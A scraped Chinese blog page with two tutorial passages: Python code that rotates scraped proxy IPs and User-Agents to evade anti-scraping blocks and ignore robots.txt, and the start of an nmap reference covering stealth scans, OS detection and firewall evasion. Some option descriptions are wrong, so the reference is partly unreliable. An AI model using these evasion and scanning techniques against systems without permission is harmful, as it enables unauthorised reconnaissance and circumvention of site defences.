class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#网上的一个爬段子的代码，我自己改了改，这个比较典型，包含了ip代理和请求头的不断更换，实现欺骗服务器的目的</span></span><br><span class="line"><span class="comment"># encoding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#网站反爬虫：一个IP频繁访问就先将该IP加入黑名单</span></span><br><span class="line"><span class="comment">#反爬虫策略：限制IP访问频率，超过频率就自动断开：降低爬虫的速度，在每个请求前加time.sleep,或更换IP</span></span><br><span class="line"><span class="comment">#策略二：后台对访问进行统计，如果单个userAgent访问超过阈值，予以封锁：误伤较大，一般网站不使用</span></span><br><span class="line"><span class="comment">#策略三：针对cookies：一般网站不使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment">#首先，我们找一个发布代理IP的网站，从该网站爬取代理IP来访问网页，当本地IP失效，启用代理IP</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">download</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.ip_list=[]   <span class="comment">#初始化列表用来存储获取到的IP</span></span><br><span class="line">        User_Agent = <span class="string">'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0'</span></span><br><span class="line">        header = &#123;&#125;</span><br><span class="line">        header[<span class="string">'User-Agent'</span>] = User_Agent</span><br><span class="line"></span><br><span class="line">        html = requests.get(<span class="string">"http://www.xicidaili.com/nn/1"</span>, headers=header)</span><br><span class="line">        response = html.text</span><br><span class="line">        soup = BeautifulSoup(response,<span class="string">'lxml'</span>)</span><br><span class="line">        ips = soup.findAll(<span class="string">'tr'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, len(ips)):</span><br><span class="line">            ip = ips[x]</span><br><span class="line">            tds = ip.findAll(<span class="string">"td"</span>)</span><br><span class="line">            ip_temp = tds[<span class="number">1</span>].contents[<span class="number">0</span>] + <span class="string">":"</span> + tds[<span class="number">2</span>].contents[<span class="number">0</span>] + <span class="string">"\n"</span></span><br><span class="line">            <span class="comment"># print tds[2].contents[0]+"\t"+tds[3].contents[0]</span></span><br><span class="line">            self.ip_list.append(ip_temp)</span><br><span class="line">        <span class="keyword">print</span> self.ip_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.user_agent_list=[</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span></span><br><span class="line">        ]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self,url,timeout,proxy=None,num_retries=<span class="number">6</span>)</span>:</span></span><br><span class="line">        ua=random.choice(self.user_agent_list)   <span class="comment">#从user_agent_list中随机抽取出一个字符串</span></span><br><span class="line">        <span class="comment"># print(ua)</span></span><br><span class="line">        header=&#123;<span class="string">"User-Agent"</span>:ua&#125;  <span class="comment">#构造一个完整的User_Agent</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> proxy==<span class="keyword">None</span>:    <span class="comment">#当代理为空时，不使用代理获取response</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response=requests.get(url,headers=header,timeout=timeout)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">if</span> num_retries&gt;<span class="number">0</span>:</span><br><span class="line">                    time.sleep(<span class="number">10</span>)</span><br><span class="line">                    print(<span class="string">u"获取网页错误，10s后将获取倒数第："</span>,num_retries,<span class="string">u"次"</span>)</span><br><span class="line">                    <span class="keyword">return</span> self.get(url,timeout,num_retries<span class="number">-1</span>)  <span class="comment">#调用自身并将次数减1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">u"开始使用代理"</span>)</span><br><span class="line">                    time.sleep(<span class="number">10</span>)</span><br><span class="line">                    IP=<span class="string">""</span>.join(str(random.choice(self.ip_list)).strip())</span><br><span class="line">                    proxy=&#123;<span class="string">"http"</span>:IP&#125;</span><br><span class="line">                    <span class="keyword">return</span> self.get(url,timeout,proxy)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                IP=<span class="string">""</span>.join(str(random.choice(self.ip_list)).strip())   <span class="comment">#随机取IP并去除空格</span></span><br><span class="line">                proxy=&#123;<span class="string">"http"</span>:IP&#125;   <span class="comment">#构造一个代理</span></span><br><span class="line">                response=requests.get(url,headers=header,proxies=proxy,timeout=timeout)  <span class="comment">#使用代理来获取response</span></span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">if</span> num_retries&gt;<span class="number">0</span>:</span><br><span class="line">                    time.sleep(<span class="number">10</span>)</span><br><span class="line">                    IP=<span class="string">""</span>.join(str(random.choice(self.ip_list)).strip())</span><br><span class="line">                    print(<span class="string">u"正在更换代理，10s后将重新获取第"</span>,num_retries,<span class="string">u"次"</span>)</span><br><span class="line">                    print(<span class="string">u"当前代理是："</span>,proxy)</span><br><span class="line">                    <span class="keyword">return</span> self.get(url,timeout,proxy,num_retries<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">u"代理发生错误，取消代理"</span>)</span><br><span class="line">                    <span class="keyword">return</span> self.get(url,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">request=download()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qsbk</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment"># header=&#123;</span></span><br><span class="line">    <span class="comment">#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',</span></span><br><span class="line">    <span class="comment">#     'Accept-Encoding': 'gzip, deflate, sdch',</span></span><br><span class="line">    <span class="comment">#     'Accept-Language': 'zh-CN,zh;q=0.8',</span></span><br><span class="line">    <span class="comment">#     'Cache-Control': 'max-age=0',</span></span><br><span class="line">    <span class="comment">#     'Connection': 'keep-alive',</span></span><br><span class="line">    <span class="comment">#     'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.235'</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment"># rep=requests.get(url,headers=header)</span></span><br><span class="line">    <span class="comment"># html=rep.text</span></span><br><span class="line">    <span class="comment"># bs=BeautifulSoup(html,"html.parser")</span></span><br><span class="line">    <span class="comment"># body=bs.body   #获取html文件的body部分</span></span><br><span class="line">    <span class="comment"># data=body.find_all("div",&#123;"class":"content"&#125;)    #此时的他为set 类型</span></span><br><span class="line">    <span class="comment"># for joke in data:</span></span><br><span class="line">    <span class="comment">#     joke_duan=joke.find("span")</span></span><br><span class="line">    <span class="comment">#     if "&lt;br/&gt;" not in str(joke_duan):    #如果段子中有&lt;br/&gt;，则string会变为None</span></span><br><span class="line">    <span class="comment">#         print(joke_duan.string)</span></span><br><span class="line">    <span class="comment">#         print("")</span></span><br><span class="line">    <span class="comment">#         # with open("joke.txt","w") as f:</span></span><br><span class="line">    <span class="comment">#         #     f.write(joke_duan.string)</span></span><br><span class="line">    html=request.get(url,<span class="number">3</span>)</span><br><span class="line">    dz=BeautifulSoup(html.text,<span class="string">"html.parser"</span>).find_all(<span class="string">"div"</span>,&#123;<span class="string">"class"</span>:<span class="string">"content"</span>&#125;)   <span class="comment">#获取一个集合</span></span><br><span class="line">    <span class="comment"># print(dz)</span></span><br><span class="line">    <span class="comment"># print(len(dz))</span></span><br><span class="line">    <span class="keyword">for</span> joke <span class="keyword">in</span> dz:   <span class="comment">#joke为一段html代码</span></span><br><span class="line">        duanzi=joke.get_text()</span><br><span class="line">        print(duanzi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    url=<span class="string">"http://www.qiushibaike.com/"</span></span><br><span class="line">    qsbk(url)</span><br></pre></td></tr></table></figure>
</li>
<li><p>每次请求后随机间隔几秒再进行下一次请求</p>
<ul>
<li>脚本里添加控制访问时间的代码，如sleep等<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.sleep( <span class="number">5</span> )</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>选择一个同类的没有防爬机制的网站，这个方法很佛系，应该说不能算是一个应对反爬机制的方法</p>
<ul>
<li>需要尽快完成脚本的时候可以使用</li>
<li>缺点：避开了问题而没有解决问题，不一定能找到<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里提供一个没有反爬机制的网站的方法</span></span><br><span class="line"><span class="comment">#使用mechanize库，模拟浏览器的行为</span></span><br><span class="line"><span class="comment">#首先要知道对这个网站的请求头，可以通过BurpSuite抓一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> mechanize</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flagmd5 = <span class="string">'762306AB890905CFF6887D5A75776382'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web_md5</span><span class="params">(md5_string)</span>:</span></span><br><span class="line">    br = mechanize.Browser()  <span class="comment"># 设置是否处理HTML http-equiv标头</span></span><br><span class="line">    br.set_handle_equiv(<span class="keyword">True</span>)  <span class="comment"># 设置是否处理重定向</span></span><br><span class="line">    br.set_handle_redirect(<span class="keyword">True</span>)  <span class="comment"># 设置是否向每个请求添加referer头</span></span><br><span class="line">    br.set_handle_referer(<span class="keyword">True</span>)  <span class="comment"># 设置是不遵守robots中的规则</span></span><br><span class="line">    br.set_handle_robots(<span class="keyword">False</span>)  <span class="comment"># 处理giz传输编码</span></span><br><span class="line">    br.set_handle_gzip(<span class="keyword">False</span>)  <span class="comment"># 设置浏览器的头部信息</span></span><br><span class="line">    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=<span class="number">1</span>)</span><br><span class="line">    br.addheaders = [(<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.7 Safari/537.36'</span>)]</span><br><span class="line">    br.open(<span class="string">'http://pmd5.com/'</span>)</span><br><span class="line">    <span class="comment">#for form in br.forms():</span></span><br><span class="line">    <span class="comment">#   print form             #如果知道表单结构这里就可以注释掉</span></span><br><span class="line">    br.select_form(name = <span class="string">"formMd5"</span>)</span><br><span class="line">    br.form[<span class="string">'key'</span>] = md5_string</span><br><span class="line">    br.submit()</span><br><span class="line">    page = br.response().read()</span><br><span class="line">    pattern = <span class="string">"&lt;em&gt;.&#123;4&#125;&lt;/em&gt;”!&lt;/p&gt;&lt;/div&gt;"</span></span><br><span class="line">    flag = re.findall(pattern,page,flags=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">print</span> flag[<span class="number">0</span>][<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">print</span> page</span><br><span class="line"></span><br><span class="line">web_md5(flagmd5)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li><h3 id="动态页面的反爬虫"><a href="#动态页面的反爬虫" class="headerlink" title="动态页面的反爬虫"></a>动态页面的反爬虫</h3><ul>
<li><h4 id="Selenium-PhantomJS"><a href="#Selenium-PhantomJS" class="headerlink" title="Selenium+PhantomJS"></a>Selenium+PhantomJS</h4><ul>
<li><strong>Selenium</strong>：<code>pip install Selenium</code><ul>
<li>Selenium是一个Web的自动化测试工具，最初是为网站自动化测试而开发的，最初是为网站自动化测试而开发的，类型像我们玩游戏用的按键精灵，可以按指定的命令自动化操作，不同是Selenium可以直接运行在浏览器上，它支持所有主流的浏览器(包括PhantomJS这些无界面的浏览器)。<br>Selenium可以根据我们的指令，让浏览器自动加载页面，获取需要的页面，甚至页面截屏，或者判断网站上某些动作是否发生。<br>Selenium自己不带浏览器，不支持浏览器的功能，它需要与第三方浏览器结合在一起才能使用。但是我们有时候需要让它内嵌在代码中运行，所有我们而已用一个叫PhantomJS的工具代替真实的浏览器。</li>
</ul>
</li>
<li><strong>PhantomJS</strong> ： <code>下载安装包，添加环境变量</code><ul>
<li>PhantomJS是一个基于Webkit的”无界面”(headless)浏览器，它会把网站加载到内存并执行页面上的JavaScript，因为不会展示图形界面，所以运行起来比完整的浏览器更高效。如果我们把Selenium和PhantomJS结合在一起，就可以运行一个非常强大的网络爬虫了，这个爬虫可以处理JavaScript、Cookie、headers，以及任何我们真实用户需要做的事情。</li>
</ul>
</li>
</ul>
</li>
<li><h4 id="使用方法，参考链接"><a href="#使用方法，参考链接" class="headerlink" title="使用方法，参考链接"></a>使用方法，参考链接</h4><ul>
<li><a href="https://www.cnblogs.com/miqi1992/p/8093958.html" target="_blank" rel="noopener">https://www.cnblogs.com/miqi1992/p/8093958.html</a></li>
<li><a href="https://www.cnblogs.com/psv-fuyang/articles/7891871.html" target="_blank" rel="noopener">https://www.cnblogs.com/psv-fuyang/articles/7891871.html</a></li>
<li><a href="https://blog.csdn.net/qq_30242609/article/details/70859891" target="_blank" rel="noopener">https://blog.csdn.net/qq_30242609/article/details/70859891</a></li>
<li><a href="https://jiayi.space/post/scrapy-phantomjs-seleniumdong-tai-pa-chong#fb_new_comment" target="_blank" rel="noopener">https://jiayi.space/post/scrapy-phantomjs-seleniumdong-tai-pa-chong#fb_new_comment</a></li>
<li><a href="https://blog.csdn.net/qq_33689414/article/details/78631009" target="_blank" rel="noopener">https://blog.csdn.net/qq_33689414/article/details/78631009</a></li>
<li><a href="https://www.cnblogs.com/luxiaojun/p/6144748.html" target="_blank" rel="noopener">https://www.cnblogs.com/luxiaojun/p/6144748.html</a></li>
<li><a href="https://www.jianshu.com/p/520749be7377" target="_blank" rel="noopener">https://www.jianshu.com/p/520749be7377</a></li>
<li><a href="https://www.jianshu.com/p/9d408e21dc3a" target="_blank" rel="noopener">https://www.jianshu.com/p/9d408e21dc3a</a></li>
<li><a href="https://segmentfault.com/a/1190000007362337" target="_blank" rel="noopener">https://segmentfault.com/a/1190000007362337</a></li>
</ul>
</li>
<li><h3 id="当你大概了解了上面的内容之后会发现，好吧，这两个狗子已经分手了"><a href="#当你大概了解了上面的内容之后会发现，好吧，这两个狗子已经分手了" class="headerlink" title="当你大概了解了上面的内容之后会发现，好吧，这两个狗子已经分手了"></a>当你大概了解了上面的内容之后会发现，好吧，这两个狗子已经分手了</h3><ul>
<li><p><code>高版本的Selenium不再支持PhantomFS</code></p>
</li>
<li><p><a href="https://blog.csdn.net/u010358168/article/details/79749149" target="_blank" rel="noopener">https://blog.csdn.net/u010358168/article/details/79749149</a></p>
</li>
<li><a href="https://blog.csdn.net/qq_30242609/article/details/79323963" target="_blank" rel="noopener">https://blog.csdn.net/qq_30242609/article/details/79323963</a></li>
<li><h4 id="解决问题的思路："><a href="#解决问题的思路：" class="headerlink" title="解决问题的思路："></a>解决问题的思路：</h4><ul>
<li>Selenuim版本降级</li>
<li>使用无界面浏览器</li>
<li>相关环境配置：<a href="https://blog.csdn.net/pengbin790000/article/details/76696714" target="_blank" rel="noopener">https://blog.csdn.net/pengbin790000/article/details/76696714</a></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="Selenuim教程"><a href="#Selenuim教程" class="headerlink" title="Selenuim教程"></a>Selenuim教程</h2><ul>
<li><a href="https://www.cnblogs.com/fnng/category/349036.html" target="_blank" rel="noopener">https://www.cnblogs.com/fnng/category/349036.html</a></li>
<li>感觉要学这个的话需要一定的时间：这里提供一个视频教程网站，这里面有详细的课程，可以学的比较完整<ul>
<li>视频：<a href="http://www.51zxw.net/list.aspx?cid=615" target="_blank" rel="noopener">http://www.51zxw.net/list.aspx?cid=615</a></li>
<li>文字：<a href="http://www.51testing.com/zhuanti/selenium.html" target="_blank" rel="noopener">http://www.51testing.com/zhuanti/selenium.html</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>

    

    
    
    
    <div>
      
    </div>
    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Nmap使用教程/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Healer">
      <meta itemprop="description" content="桃李不言，下自成蹊">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JD1412">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/14/Nmap使用教程/" class="post-title-link" itemprop="url">Nmap使用教程</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-14 06:11:48 / 修改时间：06:12:23" itemprop="dateCreated datePublished" datetime="2019-01-14T06:11:48+08:00">2019-01-14</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<h1 id="Nmap使用教程"><a href="#Nmap使用教程" class="headerlink" title="Nmap使用教程"></a>Nmap使用教程</h1></blockquote>
<p>tags: <a href="mailto:Tips@Hak5.org" target="_blank" rel="noopener">Tips@Hak5.org</a>,Hak5.org,metasploitminute.com,<a href="http://creativecommons.org/licenses/by-nc-sa/3.0/us/,Hakshop.com" target="_blank" rel="noopener">http://creativecommons.org/licenses/by-nc-sa/3.0/us/,Hakshop.com</a> User Code:SNUBS,nmap.org/download,<a href="http://nmap.org/nsedoc/(这是nmap脚本的链接)" target="_blank" rel="noopener">http://nmap.org/nsedoc/(这是nmap脚本的链接)</a></p>
<ul>
<li><h2 id="1-安装与初次使用"><a href="#1-安装与初次使用" class="headerlink" title="1.安装与初次使用"></a>1.安装与初次使用</h2><ul>
<li><p>在终端上查看Nmap的版本</p>
<pre><code>nmap --version
//如果没有安装
apt-get install nmap
</code></pre></li>
<li><p>查看计算机的端口状态</p>
<pre><code>nmap 192.168.43.80
</code></pre></li>
</ul>
</li>
<li><h2 id="2-扫描多个目标，查看工作状态"><a href="#2-扫描多个目标，查看工作状态" class="headerlink" title="2 扫描多个目标，查看工作状态"></a>2 扫描多个目标，查看工作状态</h2><pre><code>nmap 192.168.43.80 192.168.43.176 192.168.43.100
//等同于
namp 192.168.43.80,100,176

nmap 192.168.43.1-100     //扫描1到100

nmap 192.168.1-100.*       //扫描子网

nmap 192.168.43.1/24     //扫描整个子网(24:闪光CIDR标记)

cat list  //先查看已经存储好的IP列表
nmap -iL list.txt    //扫描上述列表
</code></pre></li>
<li><h2 id="3-扫描网络并排除特定的目标"><a href="#3-扫描网络并排除特定的目标" class="headerlink" title="3.扫描网络并排除特定的目标"></a>3.扫描网络并排除特定的目标</h2><pre><code>nmap -iR 3     //随机扫描

nmap 192.168.43.0/24 --exclude 192.168.43.80     //扫描排除192.168.43.80之外的在192.168.43.0网络中的IP

nmap 192.168.43.0/24 --exclude 192.168.43.80-90

nmap 192.168.43.0/24 --excludefile list.txt
</code></pre></li>
<li><h2 id="4-扫描开放网络端口"><a href="#4-扫描开放网络端口" class="headerlink" title="4.扫描开放网络端口"></a>4.扫描开放网络端口</h2><pre><code>nmap -A 192.168.43.80    //调用一些集成的命令，-o 识别远程操作系统；-sC 运行默认的脚本扫描

nc 192.168.43.80 23.......//如果我的电脑开了netcat，这样可以登录192.168.43.64（一般是64）这台惠普的电脑
</code></pre></li>
<li><h2 id="5-使用可选包扫描网络"><a href="#5-使用可选包扫描网络" class="headerlink" title="5.使用可选包扫描网络"></a>5.使用可选包扫描网络</h2><pre><code>nmap -PN 192.168.43.80   //跳过第一次ping尝试，然后对目标进行扫描(Don&apos;t ping),扫描安全级别更高的目标

nmap -sP 192.168.43.0/24   //Simple ping只通过ping来扫描

nmap -PS 192.168.43.80     //使用TCP SYN协议来发送SYN数据包，而不是ICMP（如果目标地址的ICMP被阻塞了，这个命令依旧能够执行）

nmap -PS22,80,443 192.168.43.80     //可以添加不同的端口进行发送扫描

nmap -PS 192.168.43.80     //使用TCP ACK协议来发送ACK数据包，而不是ICMP（如果目标地址的ICMP被阻塞了，这个命令依旧能够执行）

nmap -PU 192.168.43.80     //使用UDP协议来发送数据包，而不是ICMP（如果目标地址的ICMP被阻塞了，这个命令依旧能够执行）

nmap -PY 192.168.43.80     //使用CTP协议来发送数据包，而不是ICMP（如果目标地址的ICMP被阻塞了，这个命令依旧能够执行）

nmap -PE 192.168.43.80     //不设置时就默认使用-PE(ICMP Address Mask Ping，ICMP地址掩码嗅探)嗅探ICMP

nmap -PP 192.168.43.80   //一个ICMP时间戳嗅探命令，嗅探被防火墙保护的目标

nmap -PO 192.168.43.80   //代表IP协议，发送特定的协议找到目标

nmap -PO1,2,4 192.168.43.80   //代表IP协议，发送特定的协议找到目标(1:ICMP;2:IGMP;4:IP)

namp -PR 192.168.43.80   //ping命令，速度 快精准，防火墙无法拦截，当目标不在本地网络时不能使用

nmap --traceroute 192.168.43.80    //路由跟踪

nmap -R 192.168.43.80    //TAC选项实验DNS反向查找

nmap --system-dns 192.168.43.80  //DNS查找，他使用主机系统和DNS自己的解析器

nmap --dns-servers 208.67.222.222,208.84.54.222 192.168.43.80   //指定DNS服务器查找，绕过了本地系统中默认配置的DND服务器

nmap -SL 192.168.43.80    //创建一个主机列表，用来确定目标的IP地址和DNS名称，但不向目标发送任何数据包
</code></pre></li>
<li><h2 id="6-先进的扫描技术"><a href="#6-先进的扫描技术" class="headerlink" title="6.先进的扫描技术"></a>6.先进的扫描技术</h2><pre><code>nmap -sS 192.168.43.80    //TCP SYN链接扫描

nmap -sT 192.168.43.80  //tcp链接，针对没有root权限的用户

nmap -sU(or sF) 192.168.43.80   //得到使用者的UDP协议的数据包

nmap -n 192.168.43.80    //在tcp节点的扫描

nmap -sF 192.168.43.80   //从目标的包中获取一些tcp信息

nmap -sX 192.168.43.80   //Exmouth扫描

nmap -scanflags ACKPSH   //用你自己选择的包运行用户扫描（链接ACKPSH，可以通过输入ac来避免紧急的危害或用G来紧急重置，rst用来重置）

nmap -sO(or s/ a/ A) 192.168.43.80    //TCP扫描，可发现目标是否被防火墙保护

nmap --send-eth 192.168.43.80   //???

nmap --send-ip 192.168.43.80  //改变本机使用原始IP数据包
</code></pre></li>
<li><h2 id="7-端口扫描选项"><a href="#7-端口扫描选项" class="headerlink" title="7.端口扫描选项"></a>7.端口扫描选项</h2><pre><code>nmap -F 192.168.43.80    //快速扫描

nmap -p 80 192.168.43.80  //扫描特定的端口

nmap -p 80,23,8080,443-555 192.168.43.80

nmap -p http 192.168.43.80    //扫描http服务

nmap -p &quot;sm&quot; 192.168.43.80   //扫描所有含有“sm”的协议

nmap -sU -sT -p U:53,T:25 192.168.43.80    //和之前的一样，这里只是用U,T指定了端口

nmap -p &quot;*&quot; 192.168.43.80   //扫描所有

nmap --top-ports 54 192.168.43.80   //常用端口，54：端口号

nmap -r -v 192.168.43.80     //顺序扫描（入侵防火墙时有用，或者逃避检查）v:显示不安全的报告
</code></pre></li>
<li><h2 id="8-系统检测"><a href="#8-系统检测" class="headerlink" title="8.系统检测"></a>8.系统检测</h2><pre><code>nmap -O 192.168.43.80   //检测操作系统

nmap -V 192.168.43.80    //SYN扫描，获取系统信息

nmap -O --osscan-guess 192.168.43.80    //nmap不能识别是什么操作系统时，这个命令显示最大可能性的操作系统

nmap --fuzzy 192.168.43.80    //显示最大可能性的操作系统

nmap -sV 192.168.43.80    //目标哪些服务在运行

nmap -sV --version-trace 192.168.43.80    //目标哪些服务在运行，并且检测服务版本

